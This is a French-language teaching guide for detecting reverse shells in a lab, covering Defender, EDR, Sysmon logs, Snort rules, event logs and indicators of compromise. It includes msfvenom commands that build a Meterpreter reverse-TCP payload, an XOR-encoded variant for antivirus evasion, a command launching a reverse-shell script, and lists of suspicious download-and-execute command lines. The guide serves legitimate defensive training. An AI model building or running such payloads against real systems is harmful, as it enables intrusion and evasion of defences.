# Guide de Detection - Reverse Shells et C2

Guide complet pour detecter, analyser et defendre contre les reverse shells dans votre laboratoire pedagogique.

## Objectif Pedagogique

Comprendre comment les reverse shells sont detectes pour:
1. Mieux les identifier en tant que defenseur
2. Comprendre les limitations des scripts simples
3. Apprecier la valeur des outils professionnels avec evasion
4. Implementer des controles efficaces

---

## Niveaux de Detection

```
┌────────────────────────────────────────────────────┐
│  PREVENTION (Avant execution)                      │
├────────────────────────────────────────────────────┤
│  - Antivirus / Antimalware                         │
│  - Application Whitelisting                        │
│  - Email Filtering                                 │
└────────────────────────────────────────────────────┘
          │
          │ Si prevention echoue...
          ▼
┌────────────────────────────────────────────────────┐
│  DETECTION (Pendant execution)                     │
├────────────────────────────────────────────────────┤
│  - EDR (Endpoint Detection & Response)             │
│  - Behavioral Analysis                             │
│  - Network Monitoring                              │
│  - Event Log Analysis                              │
└────────────────────────────────────────────────────┘
          │
          │ Si detection echoue...
          ▼
┌────────────────────────────────────────────────────┐
│  RESPONSE (Apres compromission)                    │
├────────────────────────────────────────────────────┤
│  - Incident Response                               │
│  - Forensics                                       │
│  - Containment                                     │
│  - Recovery                                        │
└────────────────────────────────────────────────────┘
```

---

## Detection par Antivirus

### Test dans votre Lab

**Scenario: Tester Windows Defender**

**1. Creer payload Metasploit:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.100.10 LPORT=4444 \
    -f exe -o defender-test.exe
```

**2. Reactiver Windows Defender:**
```powershell
# Sur Windows lab
Set-MpPreference -DisableRealtimeMonitoring $false
```

**3. Tenter d'executer:**
```powershell
cd C:\Lab
.\defender-test.exe
```

**Resultat attendu:**
```
Windows Defender bloque immediatement!

Threat detected: Trojan:Win32/Meterpreter.A
Action taken: Quarantine
```

**Pourquoi ca detecte:**
- Signatures connues de Meterpreter
- Comportement suspect (se connecte, ouvre shell)
- Heuristics (pattern matching)

### Voir les Detections

```powershell
# Event Log Windows Defender
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -MaxEvents 10

# Details de la menace
Get-MpThreatDetection | Select-Object -Last 5

# Historique des scans
Get-MpThreatCatalog
```

### Evasion (Pedagogique)

**Encoder le payload:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.100.10 LPORT=4444 \
    -e x64/xor_dynamic -i 5 \
    -f exe -o defender-test-encoded.exe
```

**Resultat:**
- Peut bypass certains AV
- Mais EDR modernes detectent quand meme
- C'est une course constante (attaque vs defense)

---

## Detection par EDR

### Qu'est-ce qu'un EDR?

**EDR = Endpoint Detection and Response**

**Fonctionnalites:**
- Monitoring comportemental en continu
- Machine learning / AI
- Detection d'anomalies
- Telemetrie complete
- Response automatique

**Exemples:**
- CrowdStrike Falcon
- SentinelOne
- Microsoft Defender for Endpoint
- Carbon Black
- Palo Alto Cortex XDR

### Comment EDR Detecte un Reverse Shell

**1. Process Analysis:**
```
powershell.exe
  └─ Connexion reseau active (inhabituel!)
  └─ Utilise New-Object System.Net.Sockets.TCPClient
  └─ Parent process suspect (cmd.exe, explorer.exe)
```

**2. Network Behavior:**
```
Connexion sortante vers IP externe
Port non-standard (4444)
Volume de donnees suspect
Pattern de beaconing (C2 heartbeat)
```

**3. Command Line Arguments:**
```
Suspect:
powershell.exe -EncodedCommand <base64>
powershell.exe -WindowStyle Hidden -NoProfile
powershell.exe New-Object System.Net.Sockets.TCPClient
```

**4. API Calls:**
```
Sequences suspectes:
CreateRemoteThread
VirtualAllocEx
WriteProcessMemory
```

### Simulation dans votre Lab

**Sysmon = EDR Leger (Gratuit)**

**Installation:**
```powershell
# Telecharger Sysmon
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Sysmon.zip" `
    -OutFile "C:\Lab\Sysmon.zip"

Expand-Archive -Path C:\Lab\Sysmon.zip -DestinationPath C:\Lab\Sysmon

# Telecharger config SwiftOnSecurity
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" `
    -OutFile "C:\Lab\sysmonconfig.xml"

# Installer Sysmon
cd C:\Lab\Sysmon
.\Sysmon64.exe -accepteula -i ..\sysmonconfig.xml
```

**Tester Detection:**

**1. Executer reverse shell:**
```powershell
powershell.exe -File C:\Lab\basic-reverse-shell.ps1 -ListenerIP 192.168.100.10 -ListenerPort 4444
```

**2. Analyser logs Sysmon:**
```powershell
# Event ID 1: Process Creation
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
    Where-Object {$_.Id -eq 1} |
    Select-Object -First 5 |
    Format-List

# Event ID 3: Network Connection
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
    Where-Object {$_.Id -eq 3 -and $_.Message -like "*powershell*"} |
    Select-Object -First 5 |
    Format-List
```

**Event ID 3 (Network Connection) revelera:**
```
EventID: 3
ProcessGuid: {xxx}
ProcessId: 1234
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: DESKTOP-XXX\User
Protocol: tcp
SourceIp: 192.168.100.20
SourcePort: 49152
DestinationIp: 192.168.100.10
DestinationPort: 4444
```

**DETECTE!**

---

## Detection Reseau

### Monitoring avec Wireshark

**Deja fait dans lab-setup.md, mais recap:**

**1. Capturer trafic:**
```bash
# Sur Kali
sudo wireshark &
# Capture > eth0 > Start
# Filter: tcp.port == 4444
```

**2. Analyser patterns:**

**Script Simple (Texte Clair):**
```
Follow TCP Stream montre:
- Commandes en clair
- Resultats en clair
- Facile a identifier
```

**Metasploit (TCP):**
```
Follow TCP Stream montre:
- Donnees binaires
- Moins lisible mais pattern reconnaissable
- Signatures specifiques a Meterpreter
```

**Metasploit (HTTPS):**
```
Follow TCP Stream montre:
- Trafic HTTPS normal
- Difficile a distinguer de navigation web legitime
- Certificate checking peut identifier
```

### IDS/IPS Detection

**Snort / Suricata Rules**

**Detection reverse shell PowerShell:**
```
alert tcp $HOME_NET any -> $EXTERNAL_NET any (
  msg:"Possible PowerShell Reverse Shell";
  flow:to_server,established;
  content:"System.Net.Sockets.TCPClient";
  classtype:trojan-activity;
  sid:1000001;
  rev:1;
)
```

**Detection Meterpreter:**
```
alert tcp $HOME_NET any -> $EXTERNAL_NET any (
  msg:"Metasploit Meterpreter Reverse TCP";
  flow:to_server,established;
  content:"|49 be|";
  content:"|48 31 c9|";
  classtype:trojan-activity;
  sid:1000002;
  rev:1;
)
```

---

## Detection par Event Logs

### Windows Event Logs Essentiels

**Event ID 4688: Process Creation**

**Activer command line logging:**
```powershell
# Group Policy ou Registry
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" `
    -Name "ProcessCreationIncludeCmdLine_Enabled" -Value 1 -PropertyType DWORD -Force
```

**Detecter PowerShell suspect:**
```powershell
Get-WinEvent -FilterHashtable @{
    LogName='Security'
    Id=4688
} | Where-Object {
    $_.Properties[5].Value -like "*powershell*" -and
    ($_.Properties[5].Value -like "*TCPClient*" -or
     $_.Properties[5].Value -like "*-EncodedCommand*")
} | Select-Object -First 5 | Format-List
```

**Event ID 5156: Windows Filtering Platform**

```powershell
# Connexions reseau par processus
Get-WinEvent -FilterHashtable @{
    LogName='Security'
    Id=5156
} | Where-Object {
    $_.Message -like "*powershell*"
} | Select-Object -First 10 | Format-List
```

### PowerShell Script Block Logging

**Activer:**
```powershell
# Via Group Policy ou Registry
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
    -Name "EnableScriptBlockLogging" -Value 1 -PropertyType DWORD -Force
```

**Analyser:**
```powershell
Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-PowerShell/Operational'
    Id=4104
} | Where-Object {
    $_.Message -like "*TCPClient*" -or
    $_.Message -like "*System.Net.Sockets*"
} | Select-Object -First 5 | Format-List
```

**Revelera:**
- Code PowerShell exact execute
- Variables utilisees
- IPs et ports
- Timestamps

---

## Indicateurs de Compromission (IoCs)

### Processus Suspects

**Chercher:**
```powershell
# PowerShell avec connexion reseau
Get-Process powershell | ForEach-Object {
    $connections = Get-NetTCPConnection -OwningProcess $_.Id -ErrorAction SilentlyContinue
    if ($connections) {
        Write-Host "PowerShell PID $($_.Id) has network connections:"
        $connections | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State
    }
}

# cmd.exe avec connexions reseau (inhabituel)
Get-Process cmd | ForEach-Object {
    Get-NetTCPConnection -OwningProcess $_.Id -ErrorAction SilentlyContinue
}
```

### Arguments de Ligne de Commande

**Suspects:**
```
powershell.exe -EncodedCommand <base64>
powershell.exe -WindowStyle Hidden
powershell.exe -NoProfile -NonInteractive
powershell.exe IEX (New-Object Net.WebClient).DownloadString(...)
cmd.exe /c powershell.exe ...
```

**Detection:**
```powershell
Get-WmiObject Win32_Process | Where-Object {
    $_.CommandLine -like "*-EncodedCommand*" -or
    $_.CommandLine -like "*IEX*" -or
    $_.CommandLine -like "*DownloadString*"
} | Select-Object ProcessId, Name, CommandLine
```

### Connexions Reseau Suspectes

**Chercher:**
```powershell
# Connexions vers IPs externes sur ports non-standards
Get-NetTCPConnection |
    Where-Object {
        $_.State -eq "Established" -and
        $_.RemotePort -notin @(80, 443, 22, 3389) -and
        $_.RemoteAddress -notlike "192.168.*"
    } |
    Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess
```

### Fichiers Suspects

**Emplacements a surveiller:**
```
%TEMP%
%APPDATA%
C:\Users\Public\
C:\ProgramData\
Downloads\
```

**Detection:**
```powershell
# Fichiers .exe recents dans TEMP
Get-ChildItem $env:TEMP -Filter *.exe |
    Where-Object {$_.CreationTime -gt (Get-Date).AddHours(-24)} |
    Select-Object Name, CreationTime, Length

# Scripts PowerShell suspects
Get-ChildItem $env:TEMP -Filter *.ps1 |
    ForEach-Object {
        $content = Get-Content $_.FullName -Raw
        if ($content -like "*TCPClient*" -or $content -like "*System.Net.Sockets*") {
            Write-Host "Suspect script: $($_.FullName)"
        }
    }
```

---

## Exercices Pratiques

### Exercice 1: Detecter le Script Simple

**Setup:**
1. Sysmon installe et actif
2. Executer basic-reverse-shell.ps1
3. Analyser les logs

**Questions:**
- Quel Event ID revele la connexion?
- Quels arguments sont visibles?
- Le process parent est quoi?

### Exercice 2: Comparer Meterpreter

**Setup:**
1. Executer payload Metasploit
2. Comparer logs Sysmon

**Questions:**
- Differences dans les logs?
- Plus discret que script simple?
- Quels IoCs restent detectables?

### Exercice 3: Blue Team vs Red Team

**Roles:**
- Blue Team: Activer toutes detections
- Red Team: Essayer d'obtenir shell

**Blue Team Tasks:**
1. Activer Sysmon
2. Activer PowerShell logging
3. Activer command line logging
4. Monitorer en temps reel

**Red Team Tasks:**
1. Tenter script simple
2. Tenter Meterpreter
3. Tenter encodage
4. Documenter ce qui est bloque

**Debrief:**
- Qu'est-ce qui a fonctionne?
- Qu'est-ce qui a ete detecte?
- Comment ameliorer defenses?
- Comment ameliorer attaque? (pedagogique)

---

## Defense en Profondeur

### Couches de Defense

```
┌──────────────────────────────────────┐
│  1. Prevention                       │  Application Whitelisting
├──────────────────────────────────────┤  PowerShell Constrained Mode
│  2. Detection                        │  EDR, Sysmon, Logging
├──────────────────────────────────────┤
│  3. Network Segmentation             │  Firewall, IDS/IPS
├──────────────────────────────────────┤
│  4. Least Privilege                  │  Pas d'admin local
├──────────────────────────────────────┤
│  5. Patch Management                 │  Updates regulieres
├──────────────────────────────────────┤
│  6. User Awareness                   │  Formation securite
├──────────────────────────────────────┤
│  7. Incident Response                │  Plan de reponse
└──────────────────────────────────────┘
```

### Implementation

**1. Application Whitelisting:**
```powershell
# AppLocker ou WDAC
# Autoriser UNIQUEMENT executables signes
# Bloquer execution depuis %TEMP%, Downloads
```

**2. PowerShell Constrained Language:**
```powershell
$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"
# Limite capacites PowerShell
# Bloque System.Net.Sockets
```

**3. Network Egress Filtering:**
```
Firewall bloque par defaut connexions sortantes
Autoriser UNIQUEMENT destinations approuvees
Proxy obligatoire pour web
```

---

## Conclusion

**Ce que vous avez appris:**
1. Comment les reverse shells sont detectes
2. Multiple couches de detection
3. Importance de logging complet
4. IoCs specifiques a chercher
5. Defense en profondeur

**Prochaines etapes:**
1. Pratiquer detection dans votre lab
2. Configurer Sysmon completement
3. Creer vos propres regles de detection
4. Tester differents payloads
5. Comprendre pour mieux defendre

**Rappel:**
- La detection est une science
- Toujours amelioree
- Course entre attaque et defense
- Comprendre attaque = meilleure defense

---

**La meilleure detection vient de la comprehension de l'attaque.**
